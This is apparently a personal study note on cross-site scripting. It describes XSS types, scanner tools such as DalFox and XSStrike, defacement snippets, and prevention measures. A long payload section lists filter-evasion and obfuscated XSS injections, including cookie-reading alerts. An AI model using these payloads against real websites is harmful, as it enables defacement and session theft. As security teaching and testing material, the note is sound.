---
id: XSS
aliases: "Cross-Site Scripting"
tags:
  - Webapp/Exploitation/Client-Side/XSS
---

# Cross-Site Scripting

**Cross-Site Scripting**
(*[XSS](https://en.wikipedia.org/wiki/Cross-site_scripting)*)
vulnerabilities take advantage of a flaw in user input sanitization
to "write" JavaScript code to a input field on the the page
and execute it on the client side

<!-- Tip {{{-->
> [!tip]
>
> XSS can be injected into any input in the HTML page
> if their values are displayed on the page
> (*e.g., [[Webapp/Enumeration/Fingerprinting/HTTP Header]] like Cookie or User-Agent*)
<!-- }}} -->

___

<!-- XSS Types {{{-->
## XSS Types

<!-- Stored XSS {{{-->
### Stored XSS

**Stored XSS**
(*or [Persistent XSS](https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_(or_stored))*)
occurs when the data provided by the attacker is saved by the server,
and retrieved by users upon visiting the page

The injected JavaScript code should persist upon refresh

> [!todo]

<!-- }}} -->

<!-- Reflected XSS {{{-->
### Reflected XSS

**Reflected XSS**
(*or [Non-persistent XSS](https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_(reflected))*)
occurs when data provided py the attacker processed by the back-end server,
and is immediately returned to the user without sanitization

> [!todo]

1. Verify if the payload is sent as a `GET` HTTP request
[Firefox DevTools User Docs](https://firefox-source-docs.mozilla.org/devtools-user/)

2. Send the URL containing the payload to the target

<!-- }}} -->

<!-- DOM XSS {{{-->
### DOM XSS

**DOM XSS**
is completely processed on the client-side to change the page soruce
through the [Document Object Model](https://en.wikipedia.org/wiki/Document_Object_Model)

The input is reflected with a `#` in the input parameter

> [!example]-
>
> ![[xss-dom-parameter.png]]

No HTTP request is being made to the server

> [!example]-
>
> ![[xss-dom-network.png]]

<!-- }}} -->

___
<!-- }}} -->

<!-- Tools {{{-->
## Tools

<!-- DalFox {{{-->
### DalFox

[DalFox](https://github.com/hahwul/dalfox)
is a XSS scanner and utility focused on automation

[Installation](https://dalfox.hahwul.com/page/installation/)

1. Install `golang`

```sh
sudo apt install golang
```

2. Install the latest DalFox version from source

```sh
go install github.com/hahwul/dalfox/v2@latest
```

3. Add the Go bin directory to the PATH


```sh
export PATH=$PATH:$(go env GOPATH)/bin
```

[Usage](https://dalfox.hahwul.com/page/usage/)

```sh
dalfox [mode] [target] [flags]
```

[URL Mode](https://dalfox.hahwul.com/page/modes/url-mode/) -
Scan a single URL

```sh
dalfox url http://example.com
```

[URL Mode](https://dalfox.hahwul.com/page/modes/url-mode/) -
Scan a single URL with parameters

```sh
dalfox url "https://example.com/search?q=test"
```

[File mode](https://dalfox.hahwul.com/page/modes/file-mode/) -
Scan multiple URLs from a file

```sh
dalfox file targets.txt [--custom-payload payloads.txt]
```

[Pipeline Mode](https://dalfox.hahwul.com/page/modes/pipe-mode/) -
Pipeline mode for scanning multiple URLs

```sh
cat urls.txt | dalfox pipe -H "AuthToken: xxx"
```

<!-- }}} -->

<!-- XSSer {{{-->
### XSSer

[XSSer](https://github.com/epsylon/xsser) —
Detect, exploit and report XSS vulnerabilities

1. Install requirements

```sh
sudo pip3 install pycurl bs4 pygeoip gobject cairocffi selenium
```

2. Run XSSer

> [!todo]

<!-- }}} -->

<!-- XSS Strike {{{-->
### XSS Strike

[XSS Strike](https://github.com/s0md3v/XSStrike) —
XSS Scanner

1. Clone repository

```sh
git clone https://github.com/s0md3v/XSStrike.git
```

```sh
cd XSStrike
```

2. Set up Python [[Virtual Environment]]

3. Install requirements

```sh
pip install -r requirements.txt
```

4. Launch XSS Strike

```sh
python xsstrike.py -u "<url>"
```

<!-- Example {{{-->
> [!example]-
> ```sh
> python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
> ```
> ```sh
>         XSStrike v3.1.4
>
> [~] Checking for DOM vulnerabilities 
> [+] WAF Status: Offline 
> [!] Testing parameter: task 
> [!] Reflections found: 1 
> [~] Analysing reflections 
> [~] Generating payloads 
> [!] Payloads generated: 3072 
> ------------------------------------------------------------
> [+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
> [!] Efficiency: 100 
> [!] Confidence: 10 
> [?] Would you like to continue scanning? [y/N]
> ```
>
> `XSStrike` identified the parameter as vulnerable to XSS
> from the first payload
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Attack {{{-->
## Attack

### Defacing

[Website defacement](https://en.wikipedia.org/wiki/Website_defacement)
changes the visual appearance of a website

Background

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Background color

```html
<script>document.body.style.background = "#141d2b"</script>
```

Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Text

```html
document.getElementById("todo").innerHTML = "New Text"
```

### Phishing

### Session Hijacking

___
<!-- }}} -->

<!-- Payloads {{{-->
## Payloads

XSS Testing payloads

<!-- Payload Databases {{{-->
> [!tip]- Payload Databases
>
> [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list) —
> Cross Site Scripting (XSS) Vulnerability Payload List
>
> [PayloadAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
> — Cross Site Scripting
<!-- }}} -->

<!-- Common Payloads {{{-->
> [!tip]- Common Payloads
>
> Basic Payloads
>
> ```sh
> <script>alert('XSS')</script>
> <scr<script>ipt>alert('XSS')</scr<script>ipt>
> "><script>alert('XSS')</script>
> "><script>alert(String.fromCharCode(88,83,83))</script>
> <script>\u0061lert('22')</script>
> <script>eval('\x61lert(\'33\')')</script>
> <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
> <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
> ```
>
> Div payloads
>
> ```sh
> <div onpointerover="alert(45)">MOVE HERE</div>
> <div onpointerdown="alert(45)">MOVE HERE</div>
> <div onpointerenter="alert(45)">MOVE HERE</div>
> <div onpointerleave="alert(45)">MOVE HERE</div>
> <div onpointermove="alert(45)">MOVE HERE</div>
> <div onpointerout="alert(45)">MOVE HERE</div>
> <div onpointerup="alert(45)">MOVE HERE</div>
> ```
>
> Img payloads
>
> ```sh
> <img src=x onerror=alert('XSS');>
> <img src=x onerror=alert('XSS')//
> <img src=x onerror=alert(String.fromCharCode(88,83,83));>
> <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
> <img src=x:alert(alt) onerror=eval(src) alt=xss>
> "><img src=x onerror=alert('XSS');>
> "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
> <><img src=1 onerror=alert(1)>
> ```
>
> Svg payloads
>
> ```sh
> <svgonload=alert(1)>
> <svg/onload=alert('XSS')>
> <svg onload=alert(1)//
> <svg/onload=alert(String.fromCharCode(88,83,83))>
> <svg id=alert(1) onload=eval(id)>
> "><svg/onload=alert(String.fromCharCode(88,83,83))>
> "><svg/onload=alert(/XSS/)
> <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
> <svg><script>alert('33')
> <svg><script>alert&lpar;'33'&rpar;
> ```
<!-- }}} -->

[Alert](https://developer.mozilla.org/en-US/docs/Web/API/Window/alert) -
Display an alert dialog with an optional message

```sh
<script>alert(window.origin)</script>
```

<!-- Example {{{-->
> [!example]-
>
> XSS in URL bar
>
> ```sh
> https://example.com/index.php?user=<script>alert(window.origin)</script>
> ```
<!-- }}} -->

[Document Cookie](https://en.wikipedia.org/wiki/HTTP_cookie) -
Get the cookies for the current website

```sh
<script>alert(document.cookie)</script>
```

[Print dialog](https://developer.mozilla.org/en-US/docs/Web/API/Window/print) -
Open the browser's print dialog

```sh
<script>print()</script>
```

[Plain text element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/plaintext) -
Render everything following the start tag as raw text

```sh
<plaintext>
```

<!-- Example {{{-->
> [!tip]
>
> Confirm in page source code:
> The source code contains the injected JavaScript code
>
> ```html
> <div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
> </ul></ul>
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Prevention {{{-->
## Prevention

<!-- Backend {{{-->
### Backend

Prevent XSS vulnerabilities with measures on the back-end
to prevent [[#Stored XSS]] and [[#Reflected XSS]] vulnerabilities

**INPUT VALIDATION**

Use regex or library functions to validate the input fields

<!-- Example {{{-->
> [!example]-
>
> E-mail validation on a PHP backend
>
> ```php
> if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
>     // do task
> } else {
>     // reject input - do not display it
> }
> ```
<!-- }}} -->

**INPUT SANITIZATION**

Filter user input

<!-- Example {{{-->
> [!example]-
>
> Escape special characters with a backslash (`\`)
>
> PHP - [addslashes](https://www.php.net/manual/en/function.addslashes.php)
>
> ```php
> addslashes($_GET['email'])
> ```
>
> NodeJS - [DOMPurify](https://github.com/cure53/DOMPurify)
>
> ```javascript
> import DOMPurify from 'dompurify';
> var clean = DOMPurify.sanitize(dirty);
> ```
<!-- }}} -->

**OUTPUT HTML ENCODING**

<!-- Example {{{-->
> [!example]-
>
> PHP - [htmlentities](https://www.php.net/manual/en/function.htmlentities.php)
>
> ```php
> htmlentities($_GET['email']);
> ```
>
> NodeJS
>
> ```javascript
> import encode from 'html-entities';
> encode('<'); // -> '&lt;'
> ```
<!-- }}} -->

**SERVER CONFIGURATION**

Web server configuration best practices

<!-- Example {{{-->
> [!example]-
>
> - Use HTTPS across the entire domain
> - Use XSS prevention headers
> - Use the appropriate Content-Type for the page
>   (*e.g., `X-Content-Type-Options=nosniff`*)
> - Use Content-Security-Policy options
>   (*e.g., script-src 'self'*)
> - Use the [HttpOnly](https://owasp.org/www-community/HttpOnly) and
>   [Secure cookie](https://owasp.org/www-community/controls/SecureCookieAttribute)
>   flags to prevent JavaScript from reading cookies
>   and only transport them over HTTPS
<!-- }}} -->

<!-- }}} -->

<!-- Frontend {{{-->
### Frontend

**INPUT VALIDATION**

Validate input fields

<!-- Example {{{-->
> [!example]-
>
> Validate e-mail input field with [[RegEx]]
>
> ```javascript
> function validateEmail(email) {
>     const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
>     return re.test($("#login input[name=email]").val());
> }
> ```
<!-- }}} -->

**INPUT SANITIZATION**

Filter input with JavaScript code

<!-- Example {{{-->
> [!example]-
>
> [DOMPurify](https://github.com/cure53/DOMPurify) -
> Escape any special characters with a backslash (`\`)
>
> ```javascript
> <script type="text/javascript" src="dist/purify.min.js"></script>
> let clean = DOMPurify.sanitize( dirty );
> ```
<!-- }}} -->

**DIRECT INPUT**

Never use user input directly within certain HTML tags

<!-- Example {{{-->
> [!example]-
>
> - JavaScript code: `<script></script>`
> - CSS Style Code: `<style></style>`
> - Tag/Attribute Fields: `<div name='INPUT'></div>`
> - HTML Comments: `<!-- -->`
<!-- }}} -->

Avoid using JavaScript functions that allow changing raw text
of HTML fields

<!-- Example {{{-->
> [!example]-
>
> - `DOM.innerHTML`
> - `DOM.outerHTML`
> - `document.write()`
> - `document.writeln()`
> - `document.domain`
<!-- }}} -->

Avoid the certain jQuery functions

<!-- Example {{{-->
> [!example]-
>
> - `html()`
> - `parseHTML()`
> - `add()`
> - `append()`
> - `prepend()`
> - `after()`
> - `insertAfter()`
> - `before()`
> - `insertBefore()`
> - `replaceAll()`
> - `replaceWith()`
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
